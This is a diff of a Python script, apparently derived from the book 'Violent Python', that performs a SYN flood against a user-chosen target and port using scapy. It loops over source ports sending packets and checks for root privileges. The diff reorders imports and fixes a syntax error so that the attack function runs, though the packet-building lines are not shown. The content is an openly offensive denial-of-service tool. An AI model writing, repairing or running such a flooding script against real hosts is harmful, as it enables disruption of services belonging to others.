@@ -2,8 +2,12 @@
 # written by Moses Arocha
 # Created with the help of TJ O'Connor "Violent Python"
 
-import socket
+
 from scapy.all import *
+
+import socket
+import sys
+import os
 
 def SynAttack(Source, Target, Destination_Port): 
     for sport in range(1024, 65535):				# Continues to send packets 64,511 times
@@ -19,4 +23,4 @@ Destination_Port = int(raw_input("\n\n\t What Port Would You Like To Attack Thro
 
 if not os.geteuid() == 0:
     sys.exit('Must Be Root!')
-SynAttack(Source, Target, Destination_Port	 # References the SynAttack function, must be placed last so all error handling can occur.
+SynAttack(Source, Target, Destination_Port)	 # References the SynAttack function, must be placed last so all error handling can occur.
